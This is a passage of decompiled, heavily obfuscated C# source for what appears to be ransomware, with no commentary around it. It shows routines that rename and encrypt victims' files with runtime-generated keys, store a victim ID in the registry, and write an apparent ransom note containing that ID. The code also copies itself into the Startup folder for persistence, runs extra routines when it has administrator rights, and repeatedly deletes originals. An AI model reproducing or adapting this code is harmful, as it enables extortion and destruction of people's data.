						if (QOKbVStgyeVL == getString_0(107396829) && new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length > Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024)
						{
							try
							{
								if (MaDQWNsFQFSMFZ != getString_0(107385585))
								{
									if (YazilaoopZ)
									{
										MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + MaDQWNsFQFSMFZ;
									}
									File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ);
								}
							}
							catch (Exception ex2)
							{
								if (CCDyMIHlAe)
								{
									try
									{
										File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386376) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107401557) + ex2.Message + getString_0(107395766));
									}
									catch (Exception)
									{
									}
								}
								LVKhJcfUHGhpJNXz++;
								return;
							}
							if (MaDQWNsFQFSMFZ != getString_0(107385585))
							{
								CS_0024_003C_003E8__locals0.ldrdWbhdALtRA += MaDQWNsFQFSMFZ;
							}
							if (DXDIUZMazYGZy == getString_0(107396829))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in YoPwmbBPpdD)
									{
										if (CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.SnSgbcozGOnPa.MaDQWNsFQFSMFZ) && HFFrRFIpQgjXI == SmDDBVlBSoLlZfP.getString_0(107396835))
										{
											if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length)
											{
												try
												{
													ATYckHdWsYOYHnae.GBhprVwnyvota(SmDDBVlBSoLlZfP.getString_0(107389883), SmDDBVlBSoLlZfP.getString_0(107389878), SmDDBVlBSoLlZfP.getString_0(107389897), CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().EndsWith(item) && HFFrRFIpQgjXI == SmDDBVlBSoLlZfP.getString_0(107396262))
										{
											try
											{
												ATYckHdWsYOYHnae.GBhprVwnyvota(SmDDBVlBSoLlZfP.getString_0(107389883), SmDDBVlBSoLlZfP.getString_0(107389878), SmDDBVlBSoLlZfP.getString_0(107389897), CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							byte[] bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
							if (nqNdPWHffReq == getString_0(107396256))
							{
								byte[] array2 = null;
								byte[] byte_ = DwwAAJBOSmbJ.fENIZKTbvW(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024);
								if (!DwwAAJBOSmbJ.IjvngclRYVi(PLFvJzqFVyEE: (!uBIPmjbCjNt) ? (PAOJgADrbjEa ? DwwAAJBOSmbJ.ZUYcQJLxxSxnH(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : DwwAAJBOSmbJ.ZUYcQJLxxSxnH(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (PAOJgADrbjEa ? lIsgGRoCjKMwrhD.QpIcrEUyluw(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC)) : lIsgGRoCjKMwrhD.QpIcrEUyluw(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC))), rfRQjrzTSbahvMj: CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CYHcaFOGLSEpY: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!PAOJgADrbjEa)
							{
								if (!WZQPKbNkyop.RrUwydtFfvDr(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, UawyhGBHBLgS, MXXPCoXZKEzPC, null, Convert.FromBase64String(sTQyJSLcZOIiC)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!WZQPKbNkyop.RrUwydtFfvDr(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, UawyhGBHBLgS, MXXPCoXZKEzPC, bytes, Convert.FromBase64String(sTQyJSLcZOIiC)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (YazilaoopZ)
							{
								MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + MaDQWNsFQFSMFZ;
							}
							byte[] bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
							if (MaDQWNsFQFSMFZ != getString_0(107385585))
							{
								if (!UOlZmEwYRBbnfmvt)
								{
									if (!PAOJgADrbjEa)
									{
										uEiSXmUOmqEhAY(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK);
									}
									else
									{
										uEiSXmUOmqEhAY(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, Convert.FromBase64String(MXXPCoXZKEzPC));
									}
								}
								else
								{
									try
									{
										if (!PAOJgADrbjEa)
										{
											toHVfEOmOJ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
										}
										else
										{
											toHVfEOmOJ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
										}
									}
									catch (Exception ex2)
									{
										if (CCDyMIHlAe)
										{
											try
											{
												File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386376) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107385603) + ex2.Message + getString_0(107395766));
											}
											catch (Exception)
											{
											}
										}
										LVKhJcfUHGhpJNXz++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!UOlZmEwYRBbnfmvt)
							{
								if (!PAOJgADrbjEa)
								{
									uEiSXmUOmqEhAY(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107385580), bGfpmpYMCsNkyjcK);
								}
								else
								{
									uEiSXmUOmqEhAY(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107385580), Convert.FromBase64String(MXXPCoXZKEzPC));
								}
							}
							else
							{
								try
								{
									if (!PAOJgADrbjEa)
									{
										toHVfEOmOJ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
									}
									else
									{
										toHVfEOmOJ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
									}
								}
								catch (Exception ex2)
								{
									if (CCDyMIHlAe)
									{
										try
										{
											File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386376) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107385603) + ex2.Message + getString_0(107395766));
										}
										catch (Exception)
										{
										}
									}
									LVKhJcfUHGhpJNXz++;
									return;
								}
							}
							if (PAOJgADrbjEa)
							{
								if (MaDQWNsFQFSMFZ != getString_0(107385585))
								{
									QXCLEGXnLYcbL(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, bytes);
								}
								else
								{
									QXCLEGXnLYcbL(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, bytes);
								}
							}
						}
						end_IL_0855:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_100c;
			IL_100c:
			vJUzSMoRbycwzG.Remove(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
		}

		static bKLeOnnwOsJw()
		{
			Strings.CreateGetStringDelegate(typeof(bKLeOnnwOsJw));
		}
	}

	private sealed class cTttKVwFNmpq
	{
		public string cQQeCUDDoZYTm;

		public string eedfnXcwSQkQNFbIx;

		public void _003CEncrypt2_003Eb__44()
		{
			while (true)
			{
				try
				{
					File.Delete(cQQeCUDDoZYTm);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__45()
		{
			while (true)
			{
				try
				{
					if (File.Exists(eedfnXcwSQkQNFbIx))
					{
						File.Delete(eedfnXcwSQkQNFbIx);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string gheRqfduEuJ;

	public static byte[] bGfpmpYMCsNkyjcK;

	public static string HirTGWkSHczrmbY;

	public static string nsiwXjKpMUO;

	public static List<string> ZmKssmQIdPi;

	public static List<string> sjbNOeTfHdjfd;

	public static string zMQimCitOD;

	public static string MXXPCoXZKEzPC;

	public static string sTQyJSLcZOIiC;

	public static string EXVykcHaTCNay;

	public static string szjPprKwdybiP;

	public static int IwCCvRldil;

	public static string BBqvZtJMKtZyzF;

	public static string MkWPFkyuHrLz;

	public static string tGBTkHzktdbqpsN;

	public static string IHkGIfOFsBs;

	public static string PktefsOLxgM;

	public static string lvMwbEyyvL;

	public static string btzEVEliaCMI;

	public static string DhKuNmjsjM;

	public static List<string> FBdBqWxFZQgyhcDd;

	public static List<string> HMEbcaxMfcYzgl;

	public static string wbKIZmscSBasobt;

	public static string dVUrkAuvmqKS;

	public static string uSiPWDmilru;

	public static List<string> SNtBTLidlROtoV;

	public static string OcAolhvchhcmQ;

	private static string emRwjmkqcwElZk;

	public static string rmNaxrdaErS;

	public static string nnUkiNRMVi;

	public static List<string> BjijgdTbDd;

	public static List<string> VfIRuRDoHW;

	public static List<string> ZSMEaXFyFht;

	public static List<string> OKgBAQeRHSlym;

	public static string edpjkmWiBB;

	public static List<string> pmzwKqsyDlmmF;

	public static List<string> soEYuRQrgwk;

	public static string aYqzBWQifeA;

	public static string KvaSlDHIXTUnK;

	internal static DateTime GgwzZdkgUSWq;

	internal static DateTime uXNZJauCoqTzJG;

	public static string QOKbVStgyeVL;

	public static string UawyhGBHBLgS;

	public static string SSLjTeVGTsW;

	public static string fNMfifGmoXya;

	public static string rPQFiVwCriY;

	public static string yrIyoHrzWDCT;

	public static string NwrSvcEHBCxFfoz;

	public static string DXDIUZMazYGZy;

	public static List<string> YoPwmbBPpdD;

	public static string HFFrRFIpQgjXI;

	public static string PZYHNDUWTf;

	public static string MSbkqSPZNmrgShe;

	public static string xEVAdQHTwaeaG;

	public static string twJOYPWqzdD;

	public static string fKcZCslCfAJPz;

	public static string KWarveAlrUeLj;

	public static string CvhuRhPbSX;

	public static string bUDblfHLHXAcgkB;

	public static string vClGBOKLiQn;

	public static string EiyrcFiAoaX;

	public static string TcpbjRHBDJM;

	public static string SbkfEriDLMxWh;

	public static string brYmtXjlZIq;

	public static string NMKbJRePeNuLz;

	public static string OIjqWZRpNdE;

	public static string YwXcfYcDlzL;

	public static string cBZuqZfyygLLC;

	public static string XoculucrhuBC;

	public static string RoiBxbbYOpTnzdF;

	public static string lMZoDXXDrlQgS;

	public static string tBZYVYiWJKaS;

	public static string cuUuUUMpmxH;

	public static string NnZoLXRmVCvIOhK;

	public static string nmjDhIwEGnMOrO;

	public static string aYrdlpstiAwAZTu;

	public static string nqNdPWHffReq;

	public static string FIKBEEWFPHteV;

	public static string EYUcFTYiTRnwV;

	public static string[] YacSoacXjaCUC;

	public static string QtTrkEhpkGUJgMO;

	public static bool uBIPmjbCjNt;

	public static string VVNvuJuOCGKqN;

	public static bool PAOJgADrbjEa;

	public static bool hxCcwpobkJC;

	public static bool FRIhZgoxuuhF;

	public static bool ZaxDTmLwAHHZwVkZ;

	public static string dtHHyJMWMTcTg;

	public static bool CCDyMIHlAe;

	public static bool clhLaJHTBGOiPN;

	public static bool XdhdhAwnktmq;

	public static bool FRObTCxcUY;

	public static bool UOlZmEwYRBbnfmvt;

	public static string muQSQoYNOwJp;

	public static bool fgLeGcGjPkpRXH;

	public static Stopwatch lBGXxmsJjqv;

	public static int LVKhJcfUHGhpJNXz;

	public static int qXIAEocyZgLqByS;

	public static bool YazilaoopZ;

	public static string tltXBlUAjNeRsFxCp;

	public static string[] caYhozbaifo;

	public static List<string> KlnqoelvmWHjj;

	public static int GCkorullzoFEFAMeg;

	public static bool RaNDyCdUClri;

	public static bool UzsRVBPOjcbvM;

	public static bool CoyMCdqKPDBfCk;

	public static bool LoAUTpZIRmiA;

	public static bool AngOozHSWJQ;

	public static List<string> YlScjROcYdt;

	public static List<string> YFLBXGjJgWnJnbL;

	public static List<string> lIHhqAtnchnZZ;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatec;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			QBtabLAUwdUegW CS_0024_003C_003E8__locals0 = new QBtabLAUwdUegW();
			CS_0024_003C_003E8__locals0.avfxhzATpymbWL = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.avfxhzATpymbWL) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			QPzeoGqYtJE.nwGoSxAmzjN(emRwjmkqcwElZk);
		}
		catch (Exception)
		{
		}
		try
		{
			if (aYrdlpstiAwAZTu == getString_0(107396809))
			{
				Thread thread = new Thread(sdsrwvgdxWvn.DWINEAzSRJLG);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (tGBTkHzktdbqpsN == getString_0(107396809))
		{
			Thread.Sleep(int.Parse(IHkGIfOFsBs));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && NwrSvcEHBCxFfoz == getString_0(107396809))
		{
			try
			{
				hZnFNfUtYzBkS(FEZRNsQdHf(DCsyUOPpHm(getString_0(107396772))));
			}
			catch
			{
			}
		}
		try
		{
			if (btzEVEliaCMI == getString_0(107396809) && ixdlwEnOCDJ.SYNTEhJoiCKlBbQt())
			{
				new msIxNAkvXqbRy().gtmprhShLwMwfr(bool_0: false);
				ixdlwEnOCDJ.NJFiCuRRCbmF();
			}
		}
		catch (Exception)
		{
		}
		if (dVUrkAuvmqKS == getString_0(107396809) && ixdlwEnOCDJ.SYNTEhJoiCKlBbQt())
		{
			new msIxNAkvXqbRy().gtmprhShLwMwfr(bool_0: false);
			new msIxNAkvXqbRy().twHMAgwIrosII();
		}
		if (MkWPFkyuHrLz == getString_0(107396809))
		{
			WtqdRPPLGJis.BuUPsaMcFCODL();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397179);
			string text2 = text + Path.GetFileName(fileName);
			if (szjPprKwdybiP == getString_0(107396809) && fileName != text2)
			{
				Thread thread2 = new Thread(vRUMQRkpIdAEI);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (zMQimCitOD == getString_0(107396809) && mainModule != null && fileName != text2)
			{
				try
				{
					IwCCvRldil = mRYZIcPInre(0, FBdBqWxFZQgyhcDd.Count);
					File.Copy(fileName, text + FBdBqWxFZQgyhcDd[IwCCvRldil], overwrite: true);
					getString_0(107397206);
					Process.Start(text + FBdBqWxFZQgyhcDd[IwCCvRldil]);
					fbCyLjnfYvogRbL();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (aYqzBWQifeA == getString_0(107396809) && DateTime.Now < GgwzZdkgUSWq)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (KvaSlDHIXTUnK == getString_0(107396809) && DateTime.Now > uXNZJauCoqTzJG)
			{
				fbCyLjnfYvogRbL();
			}
		}
		catch
		{
		}
		QipSEJSigIFVZ();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatec == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatec = delegate
			{
				List<string> vfIRuRDoHW = VfIRuRDoHW;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						cMEEnMgkUxxsbbNh(FEZRNsQdHf(getString_0(107385498)), string_0);
					};
				}
				Parallel.ForEach(vfIRuRDoHW, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				List<string> zSMEaXFyFht = ZSMEaXFyFht;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						cMEEnMgkUxxsbbNh(FEZRNsQdHf(getString_0(107385517)), string_0);
					};
				}
				Parallel.ForEach(zSMEaXFyFht, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				if (EYUcFTYiTRnwV == getString_0(107396809))
				{
					string[] yacSoacXjaCUC = YacSoacXjaCUC;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							cMEEnMgkUxxsbbNh(FEZRNsQdHf(getString_0(107385517)), getString_0(107385492) + string_0 + getString_0(107385483));
						};
					}
					Parallel.ForEach(yacSoacXjaCUC, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				if (!KJOEdyafRmW().Contains(getString_0(107385710)))
				{
					mfHpUWwIqhik(edpjkmWiBB);
				}
				else
				{
					List<string> oKgBAQeRHSlym = OKgBAQeRHSlym;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
						{
							cMEEnMgkUxxsbbNh(FEZRNsQdHf(DCsyUOPpHm(getString_0(107385958))), string_0);
						};
					}
					Parallel.ForEach(oKgBAQeRHSlym, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				}
				List<string> source = pmzwKqsyDlmmF;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						cMEEnMgkUxxsbbNh(FEZRNsQdHf(getString_0(107385965)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatec);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396344))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396344)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107396359)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !ZmKssmQIdPi.Contains(text6) && text6 != getString_0(107396338) && text6 != getString_0(107396285) && text6 != getString_0(107396296))
								{
									ZmKssmQIdPi.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107396267)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396222))
						{
							SbkfEriDLMxWh = getString_0(107396809);
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396245))
						{
							SbkfEriDLMxWh = getString_0(107396236);
						}
					}
					if (text3.Contains(getString_0(107396231)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396222))
						{
							fgLeGcGjPkpRXH = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396245))
						{
							fgLeGcGjPkpRXH = false;
						}
					}
					if (text3.Contains(getString_0(107396726)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396222))
						{
							CCDyMIHlAe = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396245))
						{
							CCDyMIHlAe = false;
						}
					}
					if (text3.Contains(getString_0(107396713)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396222))
						{
							RaNDyCdUClri = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396245))
						{
							RaNDyCdUClri = false;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(dtHHyJMWMTcTg, getString_0(107396684) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (SbkfEriDLMxWh == getString_0(107396236))
		{
			iGGmDwNsvVDlfp();
		}
		if (UzsRVBPOjcbvM)
		{
			try
			{
				Console.WriteLine(getString_0(107396607));
				DgebTgWNbpYm.ppbbErWRZM();
			}
			catch (Exception ex6)
			{
				if (CCDyMIHlAe)
				{
					try
					{
						File.AppendAllText(dtHHyJMWMTcTg, getString_0(107396586) + ex6.Message);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (SbkfEriDLMxWh == getString_0(107396809))
		{
			try
			{
				ugWPmBlYRKrC();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && FRIhZgoxuuhF)
			{
				try
				{
					Thread thread4 = new Thread(GhKgRcJfLpEe.LvjtPVltWMnr);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			cMEEnMgkUxxsbbNh(getString_0(107396509), FEZRNsQdHf(getString_0(107396528)));
		}
		if (wbKIZmscSBasobt == getString_0(107396809) && JypwwxJDpxfD() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(mrxeSdVVYWXFqpVy.sLFEZAvoqZfC);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		if (!(nnUkiNRMVi == getString_0(107396809)))
		{
		}
		SecureString secureString = new SecureString();
		if (SSLjTeVGTsW == getString_0(107396236))
		{
			MXXPCoXZKEzPC = LWwgbnlDCjtUBM.mtRVjJjUfPHZNt(32);
			sTQyJSLcZOIiC = LWwgbnlDCjtUBM.ONIMihTttnfgOLy();
		}
		else
		{
			MXXPCoXZKEzPC = getString_0(107395943);
		}
		EXVykcHaTCNay = YXYbdoOIpUsBLC.fyuPtuIIHaRJ(MXXPCoXZKEzPC + sTQyJSLcZOIiC);
		try
		{
			if (!PAOJgADrbjEa)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(FEZRNsQdHf(getString_0(107395866)));
				if (registryKey != null)
				{
					registryKey.SetValue(FEZRNsQdHf(getString_0(107395853)) + (registryKey.ValueCount + 1), EXVykcHaTCNay);
					registryKey.Close();
				}
			}
			else
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(FEZRNsQdHf(getString_0(107395866)));
				if (registryKey != null && registryKey.ValueCount == 0)
				{
					registryKey.SetValue(FEZRNsQdHf(getString_0(107395853)) + (registryKey.ValueCount + 1), EXVykcHaTCNay);
					registryKey.Close();
				}
				else if (registryKey != null && registryKey.ValueCount != 0)
				{
					registryKey.Close();
				}
			}
		}
		catch (Exception)
		{
			AngOozHSWJQ = true;
		}
		if (CvhuRhPbSX == getString_0(107396809))
		{
			RfqaSWCLHLgU();
		}
		if (XdhdhAwnktmq)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), muQSQoYNOwJp)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), muQSQoYNOwJp), string.Concat(FEZRNsQdHf(getString_0(107395812)), new WebClient().DownloadString(FEZRNsQdHf(getString_0(107395819))), getString_0(107395746), FEZRNsQdHf(getString_0(107395741)), DateTime.Now, getString_0(107395746), FEZRNsQdHf(getString_0(107395732)), EXVykcHaTCNay));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), muQSQoYNOwJp), getString_0(107396155) + EXVykcHaTCNay);
				}
			}
			catch (Exception ex11)
			{
				if (CCDyMIHlAe)
				{
					try
					{
						File.AppendAllText(dtHHyJMWMTcTg, getString_0(107396126) + ex11.Message + getString_0(107395746));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (!LoAUTpZIRmiA)
		{
			suwJxofkVAoVrgUV.EvzDqbYLnOHZvp(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), RoiBxbbYOpTnzdF), vOvGkzlJOtnBlcf(EXVykcHaTCNay), null, null, getString_0(107396109), getString_0(107396060), null);
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			yefBXsphkSGl();
		}
		try
		{
			try
			{
				if (fgLeGcGjPkpRXH)
				{
					Console.WriteLine(getString_0(107396075));
				}
			}
			catch
			{
			}
			MOokytgLOEo(new string[1] { getString_0(107395994) }, new string[100]
			{
				getString_0(107396017),
				getString_0(107396012),
				getString_0(107396007),
				getString_0(107395966),
				getString_0(107395961),
				getString_0(107395988),
				getString_0(107395983),
				getString_0(107395978),
				getString_0(107395429),
				getString_0(107395424),
				getString_0(107395419),
				getString_0(107395446),
				getString_0(107395437),
				getString_0(107395432),
				getString_0(107395391),
				getString_0(107395386),
				getString_0(107395413),
				getString_0(107395408),
				getString_0(107395403),
				getString_0(107395366),
				getString_0(107395357),
				getString_0(107395352),
				getString_0(107395379),
				getString_0(107395374),
				getString_0(107395369),
				getString_0(107395332),
				getString_0(107395327),
				getString_0(107395322),
				getString_0(107395349),
				getString_0(107395344),
				getString_0(107395339),
				getString_0(107395302),
				getString_0(107395297),
				getString_0(107395292),
				getString_0(107395315),
				getString_0(107395310),
				getString_0(107395305),
				getString_0(107395268),
				getString_0(107395983),
				getString_0(107395263),
				getString_0(107395429),
				getString_0(107395286),
				getString_0(107395281),
				getString_0(107395276),
				getString_0(107395271),
				getString_0(107395234),
				getString_0(107395229),
				getString_0(107395224),
				getString_0(107395251),
				getString_0(107395246),
				getString_0(107395241),
				getString_0(107395204),
				getString_0(107395199),
				getString_0(107395194),
				getString_0(107395221),
				getString_0(107395216),
				getString_0(107395211),
				getString_0(107395686),
				getString_0(107395677),
				getString_0(107395672),
				getString_0(107395695),
				getString_0(107395650),
				getString_0(107395263),
				getString_0(107395669),
				getString_0(107395660),
				getString_0(107395619),
				getString_0(107395610),
				getString_0(107395633),
				getString_0(107395624),
				getString_0(107395587),
				getString_0(107395578),
				getString_0(107395601),
				getString_0(107395592),
				getString_0(107395555),
				getString_0(107395550),
				getString_0(107395545),
				getString_0(107395572),
				getString_0(107395567),
				getString_0(107395562),
				getString_0(107395521),
				getString_0(107395516),
				getString_0(107395511),
				getString_0(107395538),
				getString_0(107395533),
				getString_0(107395528),
				getString_0(107395487),
				getString_0(107395510),
				getString_0(107395505),
				getString_0(107395297),
				getString_0(107395500),
				getString_0(107395495),
				getString_0(107395458),
				getString_0(107395453),
				getString_0(107395448),
				getString_0(107395471),
				getString_0(107395466),
